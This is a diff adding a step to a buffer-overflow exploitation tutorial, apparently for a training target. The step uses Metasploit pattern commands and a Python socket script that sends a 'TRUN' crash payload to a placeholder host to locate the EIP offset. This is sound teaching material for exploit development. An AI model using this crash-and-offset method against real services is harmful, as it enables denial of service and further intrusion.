@@ -53,3 +53,40 @@ while True:
 ```
 
 Once the program crashes, Control+C and check the bytes section.
+
+# 3. Finding the Offset
+Build the first section of the offset:
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l NUMBEROFBYTES
+```
+and place the result into the following checker script:
+```python
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+offset = "" #offset here
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('TARGET-IP',TARGET-PORT))
+
+	payload = "TRUN /.:/" + offset
+
+	s.send((payload.encode()))
+	s.close()
+except:
+	print ("Error connecting to server")
+	sys.exit()
+```
+
+Run the script unto the running application until it crashes again.
+![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/c2ce21e4-6006-47b7-9a38-117e1ca18701)
+
+Find the EIP value and place it into the offset builder using the -q flag:
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l NUMBEROFBYTES -q [EIP]
+```
+![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/67aa6a60-b997-4426-85bf-7c8207405e5c)
+
